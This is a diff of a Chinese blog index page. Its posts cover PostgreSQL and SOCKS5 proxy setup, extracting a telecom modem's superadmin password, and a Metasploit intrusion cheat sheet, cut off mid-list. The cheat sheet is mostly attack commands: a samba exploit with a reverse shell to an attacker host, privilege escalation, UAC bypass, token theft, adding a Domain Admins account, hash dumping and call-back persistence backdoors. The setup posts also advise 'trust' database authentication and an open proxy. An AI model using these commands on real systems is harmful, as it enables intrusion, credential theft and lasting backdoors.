+<h4 id="创建用户和数据库-（此处未测试）"><a href="#创建用户和数据库-（此处未测试）" class="headerlink" title="创建用户和数据库 （此处未测试）"></a>创建用户和数据库 （此处未测试）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#createuser will prompt you for a password, enter it twice.</span><br><span class="line">$ createuser -U postgres -P 123456</span><br><span class="line">$ createdb -O postgres -E utf8 test_db</span><br><span class="line">$ psql</span><br><span class="line">postgres=# GRANT ALL PRIVILEGES ON postgres TO postgres;</span><br><span class="line">postgres=# \q</span><br></pre></td></tr></table></figure>
+<h4 id="进入命令行模式"><a href="#进入命令行模式" class="headerlink" title="进入命令行模式"></a>进入命令行模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -U test test_db -h localhost -W</span><br></pre></td></tr></table></figure>
+<h4 id="设置开机自启动"><a href="#设置开机自启动" class="headerlink" title="设置开机自启动"></a>设置开机自启动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -sfv /usr/local/opt/postgresql/*.plist ~/Library/LaunchAgents</span><br><span class="line">launchctl load ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist</span><br></pre></td></tr></table></figure>
+<h3 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h3><h4 id="FATAL-Ident-authentication-failed-for-user"><a href="#FATAL-Ident-authentication-failed-for-user" class="headerlink" title="FATAL: Ident authentication failed for user"></a>FATAL: Ident authentication failed for user</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is because by default PostgreSQL uses ‘ident’ authentication i.e it checks if the username exists on the system. You need to change authentication mode to ‘trust’ as we do not want to add a system user. Modify the settings in “pg_hba.conf” to use ‘trust’ authentication.</span><br></pre></td></tr></table></figure>
+<p>请修改 <code>/usr/local/var/postgres/pg_hba.conf</code> 为：</p>
+<p>安装 pgadmin，下载地址：<a href="http://www.pgadmin.org/download/macosx.php" target="_blank" rel="noopener">http://www.pgadmin.org/download/macosx.php</a></p>
+<p>via：<a href="https://yq.aliyun.com/articles/25638" target="_blank" rel="noopener">https://yq.aliyun.com/articles/25638</a></p>
 
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
-
-      
-        
-          获取天翼上网光猫的超级管理员账号和密码
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="2018/03/02/天翼光猫破解超级管理员账号密码/">
-              阅读全文 &raquo;
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="2018/03/02/Linux搭建Socks5服务端/">
+                Linux搭建Socks5服务端
             </a>
-          </div>
-          <!--/noindex-->
-        
-      
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-03-02</span>
+            
+            
+            
+        </div>
     </div>
 
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://lfoder.github.io2018/03/02/Linux搭建Socks5服务端/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lfoder">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="默小文">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="2018/03/02/Linux搭建Socks5服务端/" itemprop="url">Linux搭建Socks5服务端</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-02T23:34:19+08:00">2018-03-02</time>
-            
-
-            
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+        <div class="content">
+            <h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><ul>
+<li>CentOS release 6.5   <code>64 bit</code></li>
+</ul>
+<h3 id="下载安装与编译"><a href="#下载安装与编译" class="headerlink" title="下载安装与编译"></a>下载安装与编译</h3><blockquote>
+<p>安装依赖</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install gcc gcc-c++ automake make pam-devel openldap-devel cyrus-sasl-devel openssl-devel</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>安装最新版，可以从这里获取最新版 ==&gt; <a href="http://ss5.sourceforge.net/" target="_blank" rel="noopener">官方网站</a></p>
+</blockquote>
+<p>目前我的最新版是 <code>3.8.9-8</code>  ，使用 wget 下载：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://ncu.dl.sourceforge.net/project/ss5/ss5/3.8.9-8/ss5-3.8.9-8.tar.gz</span><br></pre></td></tr></table></figure>
+<p>解压编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf ./ss5-3.8.9-8.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ss5-3.8.9</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<h3 id="配置与使用"><a href="#配置与使用" class="headerlink" title="配置与使用"></a>配置与使用</h3><p>####设置开机启动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /etc/init.d/ss5</span><br><span class="line">chkconfig --add ss5</span><br><span class="line">chkconfig --level 345 ss5 on</span><br></pre></td></tr></table></figure>
+<h4 id="修改访问控制配置"><a href="#修改访问控制配置" class="headerlink" title="修改访问控制配置"></a>修改访问控制配置</h4><p>程序默认配置路径在 <code>/etc/opt/ss5</code>，修改配置来允许访问，编辑 <code>/etc/opt/ss5/ss5.conf</code>文件，找到如下位置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ///////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#       SHost           SPort           Authentication</span><br><span class="line">#</span><br><span class="line">auth    0.0.0.0/0               -               -</span><br></pre></td></tr></table></figure>
+<p>上面的英文字段和下面的值一一对应，如果不需要认证，只用把auth前面的 <code>#</code> 号去掉即可。然后还需要修改一处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate</span><br><span class="line">#</span><br><span class="line">permit -        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -</span><br></pre></td></tr></table></figure>
+<p>此处与上同理，去掉 permit 前面的<code>#</code> 号即可。</p>
+<h4 id="修改访问控制配置-带权限认证"><a href="#修改访问控制配置-带权限认证" class="headerlink" title="修改访问控制配置 (带权限认证)"></a>修改访问控制配置 (带权限认证)</h4><p><strong>这样配置的ss5是开放性的，任何能访问到你服务端口的人都能访问，如果你要设置账户授权访问，则可以限制使用者</strong></p>
+<p>具体设置授权访问的方法如下，同样在  <code>/etc/opt/ss5/ss5.conf</code> 文件中找到上面两处，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ///////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#       SHost           SPort           Authentication</span><br><span class="line">#</span><br><span class="line">auth    0.0.0.0/0               -               -</span><br></pre></td></tr></table></figure>
+<p>看到后面又一个 <code>Authentication</code> 字段，下面对应了一个 <code>-</code> ，这里将横杠改成 <code>u</code> 即可，修改后如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ///////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#       SHost           SPort           Authentication</span><br><span class="line">#</span><br><span class="line">auth    0.0.0.0/0               -               u</span><br></pre></td></tr></table></figure>
+<p>然后还有第二处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate</span><br><span class="line">#</span><br><span class="line">permit -        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -</span><br></pre></td></tr></table></figure>
+<p>同样 <code>Auth</code> 下面对应的横杠 <code>-</code> 改成 <code>u</code> ，修改后如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate</span><br><span class="line">#</span><br><span class="line">permit u        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -</span><br></pre></td></tr></table></figure>
+<p>这样就配置好了允许授权访问，然后你需要添加授权用户，此时操作 <code>/etc/opt/ss5/ss5.passwd</code>  文件，添加账户，一行一个，用空格隔开账号密码 <code>/etc/opt/ss5/ss5.conf</code> 内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin passw0rd123</span><br><span class="line">root pa55w0Rdl23</span><br></pre></td></tr></table></figure>
+<p>这里添加了两个授权账户，可供连接ss5服务时授权认证。</p>
+<h4 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h4><p><strong>ss5默认开启的代理端口时1080，这是一个常用的代理端口，经常会被一些黑客使用扫描器快速捕获到，我们可以通过修改默认端口的方式来隐藏ss5代理服务</strong></p>
+<p>修改默认端口的方法如下，编辑 <code>vim /etc/sysconfig/ss5</code> 文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Add startup option here</span><br><span class="line">SS5_OPTS=&quot; -u root -b 0.0.0.0:9999&quot;</span><br></pre></td></tr></table></figure>
+<p>去掉第二行前面的 <code>#</code> 井号主食 ，并将双引号中间的内容修改为上文中的配置，其中 <code>9999</code> 是修改后的代理端口，每次修改配置都需要重启ss5服务，使其生效。</p>
+<h4 id="启动、关闭-ss5-服务"><a href="#启动、关闭-ss5-服务" class="headerlink" title="启动、关闭 ss5 服务"></a>启动、关闭 ss5 服务</h4><p>启动服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ss5 start</span><br></pre></td></tr></table></figure>
+<p>关闭服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ss5 stop</span><br></pre></td></tr></table></figure>
+<p>查看运行状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ss5 status</span><br></pre></td></tr></table></figure>
+<p>重启服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ss5 restart</span><br></pre></td></tr></table></figure>
+<h4 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /var/<span class="built_in">log</span>/ss5/ss5.log</span><br></pre></td></tr></table></figure>
+<p>完。</p>
 
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
-
-      
-        
-          Linux上搭建Socks5服务器，提供代理服务
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="2018/03/02/Linux搭建Socks5服务端/">
-              阅读全文 &raquo;
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="2018/03/02/天翼光猫破解超级管理员账号密码/">
+                天翼光猫破解超级管理员账号密码
             </a>
-          </div>
-          <!--/noindex-->
-        
-      
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-03-02</span>
+            
+            
+            
+        </div>
     </div>
 
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://lfoder.github.io2018/03/01/MetaSploit内网渗透全技巧/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lfoder">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="默小文">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="2018/03/01/MetaSploit内网渗透全技巧/" itemprop="url">MetaSploit内网渗透全技巧</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-01T11:17:51+08:00">2018-03-01</time>
-            
-
-            
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="categories/MetaSploit教程/" itemprop="url" rel="index"><span itemprop="name">MetaSploit教程</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+        <div class="content">
+            <h3 id="获取密码的步骤"><a href="#获取密码的步骤" class="headerlink" title="获取密码的步骤"></a>获取密码的步骤</h3><ol>
+<li><p>首先去光猫底部看看，你会发现一个普通用户的账号和密码，登录之。</p>
+<p>​</p>
+</li>
+<li><p>假设你的光猫IP是 <code>192.168.1.1</code> 访问 <a href="http://192.168.1.1/backupsettings.conf" target="_blank" rel="noopener">http://192.168.1.1/backupsettings.conf</a> 这个连接下载配置文件。</p>
+</li>
+<li><p>重命名配置文件  <code>backupsettings.conf</code>  为 <code>backupsettings.conf.txt</code>  。</p>
+</li>
+<li><p>找到类似这样的地方，就是账号和密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;X_CT-COM_TeleComAccount&gt;</span><br><span class="line">        &lt;Password&gt;telecomadmin88888888&lt;/Password&gt;</span><br><span class="line">&lt;/X_CT-COM_TeleComAccount&gt;</span><br></pre></td></tr></table></figure>
+<p>其中通用账号是：<code>telecomadmin</code></p>
+<p>密码则是：<code>telecomadmin88888888</code></p>
+</li>
+</ol>
 
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
-
-      
-        
-          如何使用 MetaSploit 在内网中渗透最大化，阅读全文查看内网渗透神器的利用姿势。
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="2018/03/01/MetaSploit内网渗透全技巧/">
-              阅读全文 &raquo;
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="2018/03/01/MetaSploit内网渗透全技巧/">
+                MetaSploit内网渗透全技巧
             </a>
-          </div>
-          <!--/noindex-->
-        
-      
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-03-01</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/MetaSploit教程/">MetaSploit教程</a>
+                </span>
+            
+        </div>
     </div>
 
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://lfoder.github.io2018/02/23/树莓派创建钓鱼WiFi实战全过程/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lfoder">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="默小文">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="2018/02/23/树莓派创建钓鱼WiFi实战全过程/" itemprop="url">树莓派创建钓鱼WiFi实战全过程</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-23T14:59:20+08:00">2018-02-23</time>
-            
-
-            
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+        <div class="content">
+            <h2 id="技巧汇总"><a href="#技巧汇总" class="headerlink" title="技巧汇总"></a>技巧汇总</h2><h3 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h3><p>方法一：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets //获取网段</span><br><span class="line">meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由</span><br><span class="line">meterpreter &gt; run autoroute -p //查看路由</span><br><span class="line">meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段</span><br><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。</span><br><span class="line">meterpreter &gt; background //后台sessions</span><br></pre></td></tr></table></figure>
+<p>方法二：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run get_local_subnets #查看网段/子网 </span><br><span class="line">Local subnet: 192.168.33.0/255.255.255.0 </span><br><span class="line">meterpreter&gt; background #转入后台运行 </span><br><span class="line">msf&gt; route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息 </span><br><span class="line">msf&gt; route print #查看添加的信息 </span><br><span class="line">msf&gt; use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻 </span><br><span class="line">msf&gt; set payload linux/x86/shell/reverse_tcp </span><br><span class="line">msf&gt; set LHOST 10.10.1.129 #此处为attacking 主机的外网IP </span><br><span class="line">msf&gt; set LPORT 8080 </span><br><span class="line">msf&gt; set RHOST 192.168.33.132 #内网目标主机 </span><br><span class="line">msf&gt; exploit </span><br><span class="line">也可以使用自动式添加路由模块： </span><br><span class="line">msf&gt; load auto_add_route </span><br><span class="line">msf&gt; exploit</span><br></pre></td></tr></table></figure>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>自动化提权：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法</span><br></pre></td></tr></table></figure>
+<p>半自动提权：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background //先后台运行会话</span><br><span class="line">[*] Backgrounding session 1…</span><br><span class="line">msf &gt; use post/windows/escalate/ms10_073_kbdlayout</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set session 1 //设置要使用的会话</span><br><span class="line">msf post(ms10_073_kbdlayout) &gt; exploit</span><br><span class="line">注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。</span><br><span class="line">或者直接：</span><br><span class="line">meterpreter &gt; run post/windows/escalate/ms10_073_kbdlayout</span><br></pre></td></tr></table></figure>
+<h3 id="令牌窃取与模拟"><a href="#令牌窃取与模拟" class="headerlink" title="令牌窃取与模拟"></a>令牌窃取与模拟</h3><p>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。 </p>
+<ul>
+<li>窃取令牌</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito //进入这个模块</span><br><span class="line">meterpreter &gt; list_tokens –u //查看存在的令牌</span><br><span class="line">meterpreter &gt; impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠</span><br><span class="line"></span><br><span class="line">注：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>令牌模拟</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; ps # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID 为380 </span><br><span class="line">meterpreter&gt; steal_token 380 </span><br><span class="line">有时ps 命令列出的进程中可能不存在域控账户的进程，此时使用incognito 模块查看可 </span><br><span class="line">用token： </span><br><span class="line">meterpreter&gt; use incognito </span><br><span class="line">meterpreter&gt; list_tokens –u #列出可用token，假如找到域控token </span><br><span class="line">meterpreter&gt; impersonate_token SNEAKS.IN\ihazdomainadmin </span><br><span class="line">meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户 </span><br><span class="line">meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50 #将账户添加至域管理员组</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+</ul>
+<h3 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set session 4</span><br><span class="line">msf &gt; run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权</span><br></pre></td></tr></table></figure>
+<h3 id="HashDump"><a href="#HashDump" class="headerlink" title="HashDump"></a>HashDump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好</span><br></pre></td></tr></table></figure>
+<p>64 位win7 下需要管理员权限执行后门且先getsystem，然后使用 <code>run post/windows/gather/hashdump</code> 来dump hash 成功率更高。<br>而且如果要使用shell 添加系统账户的话win7 下得先： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/escalate/bypassuac</span><br></pre></td></tr></table></figure>
+<p>不然可能不会成功</p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><ul>
+<li><p>服务启动后门</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler //新终端中监听</span><br><span class="line">msf &gt; set payload windows/metsvc_bind_tcp</span><br><span class="line">msf &gt; set LPORT 31337</span><br><span class="line">msf &gt; set RHOST 192.168.0.128</span><br><span class="line">msf &gt; run //获取到的会话是system权限</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>启动项启动后门</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105</span><br></pre></td></tr></table></figure>
+<p>-X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。注意到移除 persistence 后门的办法是删除 <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code> 中的注册表键和 <code>C:\WINDOWS\TEMP\</code> 中的 VBScript 文件。</p>
+<p>下次连接时： </p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use multi/handler </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LPOST 443 </span><br><span class="line">set LHOST 192.168.1.111 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>   会在以下位置和注册表以随机文件名写入文件等信息，如： </p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs </span><br><span class="line">C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe </span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)</span><br></pre></td></tr></table></figure>
+<p>  缺点：容易被杀毒软件杀 。</p>
+<blockquote>
+<p>弊端：这两个后门有个弊端，在进程中都会存在服务名称为meterpreter的进程</p>
+</blockquote>
+<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><ul>
+<li><p>端口扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.2.1-255</span><br><span class="line">set ports 21,22,25,443,445,1433,3306</span><br><span class="line">set threads 20</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>MSSQL开发利用</p>
+<ol>
+<li><p>对各个ip是否有mssql服务的探测</p>
